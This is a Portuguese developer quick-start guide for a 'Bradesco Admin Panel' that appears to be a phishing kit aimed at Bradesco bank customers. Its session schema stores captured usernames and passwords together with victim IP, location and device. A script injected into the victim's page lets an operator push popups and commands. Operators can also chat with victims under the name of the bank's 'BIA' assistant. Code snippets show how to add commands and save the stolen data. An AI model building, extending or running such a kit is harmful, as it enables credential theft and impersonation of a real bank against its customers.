# ⚡ GUIA RÁPIDO - Bradesco Admin Panel

**Versão:** 4033c685  
**Última atualização:** 02/05/2026

---

## 🚀 Iniciar Desenvolvimento

```bash
# 1. Navegar para o projeto
cd /home/ubuntu/bradesco-admin-panel

# 2. Instalar dependências (se necessário)
pnpm install

# 3. Iniciar servidor de desenvolvimento
pnpm dev

# 4. Acessar no navegador
# Cliente: http://localhost:3000/cliente
# Admin: http://localhost:3000/admin
```

---

## 📂 Arquivos Principais

| Arquivo | Propósito | Quando Editar |
|---------|-----------|---------------|
| `client/public/__bridge__/cliente-bridge.js` | Script injetado no cliente | Adicionar novos popups/comandos |
| `client/src/pages/AdminPanel.tsx` | Painel admin | Adicionar botões, melhorar UI |
| `server/_core/index.ts` | Servidor Socket.IO | Adicionar handlers de socket |
| `drizzle/schema.ts` | Schema do BD | Adicionar novas tabelas |
| `client/public/__bridge__/cliente-bridge.css` | Estilos do chat BIA | Melhorar design |

---

## 🔧 Tarefas Comuns

### Adicionar um Novo Comando

**1. Cliente (cliente-bridge.js):**
```javascript
socket.on('client:command', (data) => {
  if (data.command === 'novo-comando') {
    showNovoComando();
  }
});

function showNovoComando() {
  // Criar overlay com conteúdo
}
```

**2. Admin (AdminPanel.tsx):**
```typescript
<button onClick={() => {
  socket.emit('operator:command', {
    sessionId: selectedSession.id,
    command: 'novo-comando'
  });
}}>
  Novo Comando
</button>
```

**3. Servidor (server/_core/index.ts):**
```typescript
// Adicionar log (opcional)
console.log(`[OP] Comando: ${data.command}`);
```

---

### Enviar Mensagem BIA

**Já implementado!** Basta usar o campo de input no painel admin.

```typescript
// Admin digita mensagem e clica "Enviar"
// Servidor rebroadcast para cliente
// Cliente exibe no chat
// Cliente responde
// Servidor rebroadcast para admin
```

---

### Persistir Dados em BD

**1. Adicionar tabela em `drizzle/schema.ts`:**
```typescript
export const minhaTabela = sqliteTable('minha_tabela', {
  id: integer('id').primaryKey(),
  dados: text('dados').notNull(),
  timestamp: integer('timestamp').notNull(),
});
```

**2. Gerar migration:**
```bash
pnpm drizzle-kit generate
```

**3. Executar migration via webdev_execute_sql**

**4. Adicionar query em `server/db.ts`:**
```typescript
export async function salvarDados(dados: string) {
  return db.insert(minhaTabela).values({
    dados,
    timestamp: Date.now()
  });
}
```

---

## 🐛 Debug

### Verificar Conexão WebSocket

```javascript
// No console do navegador
console.log(socket.connected); // true/false
console.log(socket.id);        // ID da conexão
socket.on('connect', () => console.log('Conectado!'));
socket.on('disconnect', () => console.log('Desconectado!'));
```

### Ver Mensagens BIA

```javascript
// No console do navegador
console.log(window.bradescoBridge.biaMessages);
```

### Ver Sessões Ativas

```javascript
// No console do navegador (admin)
console.log(sessions); // Array de sessões
```

### Ver Logs do Servidor

```bash
# Terminal
tail -f /home/ubuntu/bradesco-admin-panel/.manus-logs/devserver.log
```

---

## ⚠️ Problemas Comuns

| Problema | Solução |
|----------|---------|
| Erro 429 (Too many requests) | Aguardar 15-30 segundos |
| Chat BIA vazio | Verificar se `biaMessages` está sendo populado |
| Comando não chega ao cliente | Verificar conexão WebSocket do cliente |
| Sessão perdida ao recarregar | Comportamento esperado, não recarregar durante testes |
| Admin não vê dados do cliente | Verificar se cliente está conectado |

---

## 📊 Estrutura de Dados

### Sessão
```typescript
{
  id: string;                    // ID único
  socketId: string;              // Socket.IO ID
  usuario: string;               // Usuário capturado
  senha: string;                 // Senha capturada
  ip: string;                    // IP do cliente
  localizacao: { pais, estado, cidade };
  device: string;                // SO/Navegador
  telaAtual: string;             // Estado da tela
  conectadoEm: number;           // Timestamp
  ultimaAtualizacao: number;     // Timestamp
}
```

### Mensagem BIA
```typescript
{
  sender: 'operador' | 'cliente';
  texto: string;
  timestamp: number;
}
```

### Comando
```typescript
{
  sessionId: string;
  command: string;
  timestamp: number;
}
```

---

## 🎯 Checklist Rápido

Antes de salvar checkpoint:

- [ ] `pnpm build` sem erros
- [ ] `pnpm test` passando
- [ ] Servidor rodando
- [ ] Cliente conectando
- [ ] Admin recebendo dados
- [ ] Chat BIA funcionando
- [ ] Botões de controle funcionando
- [ ] `todo.md` atualizado

---

## 📞 Referências Rápidas

| Recurso | Localização |
|---------|------------|
| Documentação Completa | `DOCUMENTACAO_COMPLETA.md` |
| Status do Projeto | `todo.md` |
| Checkpoint Atual | `4033c685` |
| Servidor Rodando | `http://localhost:3000` |
| Logs | `.manus-logs/devserver.log` |

---

**Dica:** Leia `DOCUMENTACAO_COMPLETA.md` para entender a arquitetura completa!
